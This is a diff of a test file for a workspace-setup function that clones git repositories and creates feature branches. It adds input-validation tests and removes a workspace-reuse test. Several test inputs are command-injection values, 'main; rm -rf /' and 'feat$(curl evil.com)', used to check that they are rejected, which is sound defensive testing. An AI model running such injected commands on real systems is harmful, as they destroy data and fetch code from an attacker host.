@@ -100,7 +100,6 @@ describe('setupWorkspace', () => {
     expect(result.repoName).toBe('repo');
     expect(result.branch).toMatch(/^feat\/claude-session-/);
     expect(result.workspacePath).toContain('/tmp/workspaces/repo-feat-claude-session-');
-    expect(result.reused).toBe(false);
 
     // 验证 execFileSync 调用了 git clone 和 git checkout
     expect(mockExecFileSync).toHaveBeenCalledTimes(2);
@@ -116,11 +115,17 @@ describe('setupWorkspace', () => {
     expect(checkoutCall[1]![1]).toBe('-b');
   });
 
-  it('should clone local repo', () => {
+  it('should clone local repo when path exists', () => {
+    // localPath 存在性检查需要返回 true
+    mockExistsSync.mockImplementation((p) => {
+      if (p === '/tmp/workspaces') return true;
+      if (p === '/home/user/projects/my-app') return true;
+      return false;
+    });
+
     const result = setupWorkspace({ localPath: '/home/user/projects/my-app' });
 
     expect(result.repoName).toBe('my-app');
-    expect(result.reused).toBe(false);
 
     const cloneCall = mockExecFileSync.mock.calls[0];
     expect(cloneCall[1]).toContain('/home/user/projects/my-app');
@@ -157,23 +162,9 @@ describe('setupWorkspace', () => {
   });
 
   it('should not create baseDir if it already exists', () => {
-    mockExistsSync.mockImplementation((p) => {
-      if (p === '/tmp/workspaces') return true;
-      return false;
-    });
-
     setupWorkspace({ repoUrl: 'https://github.com/user/repo' });
 
     expect(mockMkdirSync).not.toHaveBeenCalled();
-  });
-
-  it('should reuse existing workspace directory', () => {
-    mockExistsSync.mockReturnValue(true); // baseDir 和 workspacePath 都存在
-
-    const result = setupWorkspace({ repoUrl: 'https://github.com/user/repo' });
-
-    expect(result.reused).toBe(true);
-    expect(mockExecFileSync).not.toHaveBeenCalled();
   });
 
   it('should wrap git clone errors', () => {
@@ -196,17 +187,13 @@ describe('setupWorkspace', () => {
       .toThrow('创建分支失败: fatal: branch already exists');
   });
 
-  it('should use execFileSync (not execSync) to prevent shell injection', () => {
-    setupWorkspace({ repoUrl: 'https://github.com/user/repo; rm -rf /' });
-
-    // execFileSync 传数组参数，不经过 shell 解释
-    const cloneCall = mockExecFileSync.mock.calls[0];
-    expect(cloneCall[0]).toBe('git');
-    // source 作为独立参数传入，不会被 shell 解释
-    expect(cloneCall[1]).toContain('https://github.com/user/repo; rm -rf /');
-  });
-
   it('should prefer repoUrl over localPath when both provided', () => {
+    mockExistsSync.mockImplementation((p) => {
+      if (p === '/tmp/workspaces') return true;
+      if (p === '/local/path') return true;
+      return false;
+    });
+
     const result = setupWorkspace({
       repoUrl: 'https://github.com/user/repo',
       localPath: '/local/path',
@@ -216,5 +203,68 @@ describe('setupWorkspace', () => {
     expect(cloneCall[1]).toContain('https://github.com/user/repo');
     expect(cloneCall[1]).not.toContain('/local/path');
     expect(result.repoName).toBe('repo');
+  });
+
+  // ============================================================
+  // 输入校验
+  // ============================================================
+
+  describe('input validation', () => {
+    it('should reject repoUrl without valid protocol', () => {
+      expect(() => setupWorkspace({ repoUrl: 'not-a-url' }))
+        .toThrow('无效的仓库 URL: not-a-url');
+    });
+
+    it('should accept HTTPS URL', () => {
+      expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
+        .not.toThrow();
+    });
+
+    it('should accept SSH URL', () => {
+      expect(() => setupWorkspace({ repoUrl: 'git@github.com:user/repo.git' }))
+        .not.toThrow();
+    });
+
+    it('should accept ssh:// URL', () => {
+      expect(() => setupWorkspace({ repoUrl: 'ssh://git@github.com/user/repo' }))
+        .not.toThrow();
+    });
+
+    it('should accept git:// URL', () => {
+      expect(() => setupWorkspace({ repoUrl: 'git://github.com/user/repo' }))
+        .not.toThrow();
+    });
+
+    it('should reject localPath that does not exist', () => {
+      mockExistsSync.mockImplementation((p) => {
+        if (p === '/tmp/workspaces') return true;
+        return false; // localPath 不存在
+      });
+
+      expect(() => setupWorkspace({ localPath: '/nonexistent/path' }))
+        .toThrow('本地路径不存在: /nonexistent/path');
+    });
+
+    it('should reject sourceBranch with shell metacharacters', () => {
+      expect(() => setupWorkspace({
+        repoUrl: 'https://github.com/user/repo',
+        sourceBranch: 'main; rm -rf /',
+      })).toThrow('无效的分支名: main; rm -rf /');
+    });
+
+    it('should reject featureBranch with shell metacharacters', () => {
+      expect(() => setupWorkspace({
+        repoUrl: 'https://github.com/user/repo',
+        featureBranch: 'feat$(curl evil.com)',
+      })).toThrow('无效的分支名');
+    });
+
+    it('should accept valid branch names with slashes, dots, dashes', () => {
+      expect(() => setupWorkspace({
+        repoUrl: 'https://github.com/user/repo',
+        sourceBranch: 'release/v1.2.3',
+        featureBranch: 'feat/my-feature_v2',
+      })).not.toThrow();
+    });
   });
 });
